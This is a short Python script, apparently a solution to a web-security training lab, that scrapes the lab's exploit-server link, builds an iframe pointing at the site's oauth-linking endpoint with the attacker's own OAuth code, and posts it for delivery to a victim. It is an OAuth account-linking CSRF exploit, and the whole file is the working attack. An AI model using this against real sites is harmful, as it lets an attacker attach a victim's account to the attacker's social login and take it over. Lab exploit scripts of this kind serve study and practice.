import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

home_url = f'https://{site}/'
resp = s.get(home_url)

soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

# Grab from oauth-login endpoint during login with social media process
oauth_login_code = ''

# Construct iframe with my oauth code to trick a victim into completing my oauth process
exploit_iframe = f'<iframe src="https://{site}/oauth-linking?code={oauth_login_code}"></iframe>'
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_iframe,
    'formAction': 'DELIVER_TO_VICTIM'
}
resp = s.post(exploit_url, data=formData)